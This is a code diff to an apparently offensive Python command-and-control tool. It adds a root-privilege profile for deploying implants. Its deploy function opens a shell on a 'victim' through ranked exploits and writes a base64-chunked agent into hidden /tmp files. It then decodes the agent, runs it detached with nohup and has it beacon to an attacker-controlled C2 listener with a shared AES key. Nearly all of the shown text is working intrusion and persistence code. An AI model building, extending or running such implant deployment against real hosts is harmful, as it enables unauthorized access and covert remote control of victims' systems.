@@ -44,6 +44,9 @@ _PID_FILE = _SESSIONS_DIR / "c2_server.pid"
 _C2_LOG = _SESSIONS_DIR / "c2_server.log"
 
 _ID_RE = re.compile(r"^[A-Za-z0-9][A-Za-z0-9_-]{0,63}$")
+ROOT_PRIVILEGE = "root"
+LOW_PRIVILEGE = "lowpriv"
+_ROOT_STAGED_MARKER = "sysagent-r"
 _CREDENTIALS_FILE = _BASE_DIR / ".c2_credentials.txt"
 
 
@@ -82,10 +85,29 @@ def _unverified_context() -> Any:
     return factory()
 
 
-def client_id_for(target: str) -> str:
-    """Derive a stable, file-safe client id from a target IP."""
+def client_id_for(target: str, privilege: str = LOW_PRIVILEGE) -> str:
+    """Derive a stable, file-safe client id from a target IP.
+
+    Root-profile deployments get a ``-root`` suffix so one box can hold
+    two parallel C2 clients (a low-priv foothold and an elevated one)
+    without sharing command queues or beacon logs.
+
+    Args:
+        target: Victim address.
+        privilege: ``lowpriv`` (default) or ``root``.
+
+    Returns:
+        Deterministic client id like ``msf-10-0-0-5-root``.
+
+    Raises:
+        ValueError: Unknown privilege value.
+    """
+    wanted = str(privilege or "").strip().lower()
+    if wanted and wanted not in (LOW_PRIVILEGE, ROOT_PRIVILEGE):
+        raise ValueError(f"Unknown privilege: {privilege!r}")
     slug = re.sub(r"[^A-Za-z0-9]+", "-", (target or "").strip()).strip("-") or "target"
-    return f"msf-{slug.lower()}"[:64]
+    base = f"msf-{slug.lower()}"[:64]
+    return f"{base}-root" if wanted == ROOT_PRIVILEGE else base
 
 
 def validate_client_id(raw: str) -> str:
@@ -351,8 +373,34 @@ if __name__ == "__main__":
 """
 
 
-def build_agent(c2_url: str, client_id: str, aes_hex: str, route: str = "", sleep: int = 10) -> str:
-    """Render the agent script for a target (pure function, no I/O)."""
+def build_agent(
+    c2_url: str,
+    client_id: str,
+    aes_hex: str,
+    route: str = "",
+    sleep: int = 10,
+    privilege: str = LOW_PRIVILEGE,
+) -> str:
+    """Render the agent script for a target (pure function, no I/O).
+
+    Args:
+        c2_url: Base C2 URL (http or https).
+        client_id: Stable target-id handle for command pairing.
+        aes_hex: Shared 64-hex AES-256 key.
+        route: Malleable listener route (default ``/``).
+        sleep: Beacon sleep seconds, clamped 2..300.
+        privilege: ``lowpriv`` (default) or ``root`` profile — only the
+            client id embedding differs.
+
+    Returns:
+        The full python2-compatible agent source.
+
+    Raises:
+        ValueError: Bad key format, URL scheme or privilege value.
+    """
+    wanted = str(privilege or "").strip().lower()
+    if wanted and wanted not in (LOW_PRIVILEGE, ROOT_PRIVILEGE):
+        raise ValueError(f"Unknown privilege: {privilege!r}")
     key = (aes_hex or "").strip().lower()
     if not re.fullmatch(r"[0-9a-f]{64}", key):
         raise ValueError("AES key must be 64 hex chars (AES-256)")
@@ -366,7 +414,10 @@ def build_agent(c2_url: str, client_id: str, aes_hex: str, route: str = "", slee
         route += "/"
     text = AGENT_TEMPLATE.replace("{C2}", url)
     text = text.replace("{ROUTE}", route)
-    text = text.replace("{ID}", validate_client_id(client_id))
+    if wanted == ROOT_PRIVILEGE and "-root" not in (client_id or ""):
+        text = text.replace("{ID}", validate_client_id(f"{client_id}-root"))
+    else:
+        text = text.replace("{ID}", validate_client_id(client_id))
     text = text.replace("{KEY}", key)
     text = text.replace("{SLEEP}", str(max(2, min(int(sleep), 300))))
     return text
@@ -449,18 +500,41 @@ def deploy(
     route: str = "",
     lhost: str = "127.0.0.1",
     sleep: int = 10,
+    privilege: str = LOW_PRIVILEGE,
 ) -> dict[str, Any]:
     """Deliver + launch the agent on *target* via a working shell primitive.
 
     Uses the highest-ranked exec-capable exploit to drop the rendered
-    agent at /tmp/.sysagent, chmod +x, and launch it detached. Returns
-    the client id and a callback-wait summary.
+    agent, chmod +x, and launch it detached. Returns the client id and
+    a callback-wait summary. ``privilege="root"`` restricts the shell
+    primitive to root-capable exploits and stages the binary under a
+    different name so a low-priv agent on the same box keeps running.
+
+    Args:
+        target: Victim address.
+        c2_base: Listener base URL (e.g. ``http://172.17.0.1:8080``).
+        route: Malleable route (default ``/``).
+        lhost: Attacker address for shell triggers.
+        sleep: Beacon sleep seconds (clamped 2..300).
+        privilege: ``lowpriv`` (default) or ``root`` profile.
+
+    Returns:
+        Deployment dict: ``deployed``, ``client_id``, ``via``, ``staged``,
+        ``size_ok``, ``agent_running`` and snippets.
+
+    Raises:
+        ValueError: Unknown privilege value.
     """
     from atomic_exploit_bridge import open_shell, remote_exec
 
-    client_id = client_id_for(target)
+    wanted = str(privilege or "").strip().lower()
+    if wanted and wanted not in (LOW_PRIVILEGE, ROOT_PRIVILEGE):
+        raise ValueError(f"Unknown privilege: {privilege!r}")
+    is_root = wanted == ROOT_PRIVILEGE
+    client_id = client_id_for(target, privilege=wanted)
     aes_hex = _ensure_key()
-    agent = build_agent(c2_base, client_id, aes_hex, route=route, sleep=sleep)
+    agent = build_agent(c2_base, client_id, aes_hex, route=route, sleep=sleep, privilege=wanted)
+    recently = "sysagent-r" if is_root else "sysagent"
     staged = _SESSIONS_DIR / "temp_uploads" / f"agent_{client_id}.py"
     staged.parent.mkdir(parents=True, exist_ok=True)
     staged.write_text(agent, encoding="utf-8")
@@ -470,9 +544,14 @@ def deploy(
             queue_file.write_text("[]", encoding="utf-8")
     except OSError:
         pass
-    spec = open_shell(target, lhost=lhost)
+    spec = open_shell(target, lhost=lhost, privilege=wanted)
     if spec is None:
-        return {"deployed": False, "reason": "no working shell primitive", "client_id": client_id}
+        reason = (
+            "no root-capable shell primitive"
+            if is_root
+            else "no working shell primitive"
+        )
+        return {"deployed": False, "reason": reason, "client_id": client_id}
     import base64 as _b64
 
     from atomic_exploit_bridge import close_sessions as _close_shells
@@ -481,24 +560,31 @@ def deploy(
     chunk = 4000
     parts = [blob[i : i + chunk] for i in range(0, len(blob), chunk)]
     try:
-        remote_exec(spec, target, f"printf '%s' '{parts[0]}' > /tmp/.sysagent.b64", lhost=lhost)
+        remote_exec(spec, target, f"printf '%s' '{parts[0]}' > /tmp/.{recently}.b64", lhost=lhost)
         for part in parts[1:]:
-            remote_exec(spec, target, f"printf '%s' '{part}' >> /tmp/.sysagent.b64", lhost=lhost)
+            remote_exec(spec, target, f"printf '%s' '{part}' >> /tmp/.{recently}.b64", lhost=lhost)
         verify = remote_exec(
             spec,
             target,
-            "base64 -d /tmp/.sysagent.b64 > /tmp/.sysagent && rm -f /tmp/.sysagent.b64"
-            " && wc -c < /tmp/.sysagent && head -1 /tmp/.sysagent",
+            f"base64 -d /tmp/.{recently}.b64 > /tmp/.{recently} && rm -f /tmp/.{recently}.b64"
+            f" && wc -c < /tmp/.{recently} && head -1 /tmp/.{recently}",
             lhost=lhost,
         )
         size_ok = str(len(agent.encode())) in (verify or "")
-        launched = remote_exec(spec, target, "chmod +x /tmp/.sysagent && (nohup python /tmp/.sysagent </dev/null >/dev/null 2>&1 &) && sleep 2 && ps aux | grep -c '[.]sysagent'", lhost=lhost)
+        grep_pattern = f"'[{recently[0]}]{recently[1:]}'"
+        launched = remote_exec(
+            spec,
+            target,
+            f"chmod +x /tmp/.{recently} && (nohup python /tmp/.{recently} </dev/null >/dev/null 2>&1 &) && sleep 2 && ps aux | grep -c {grep_pattern}",
+            lhost=lhost,
+        )
         running = (launched or "").strip().split()[-1] if (launched or "").strip() else "0"
     finally:
         _close_shells(target)
     return {
         "deployed": True,
         "client_id": client_id,
+        "privilege": wanted,
         "via": spec.id,
         "staged": str(staged),
         "size_ok": size_ok,
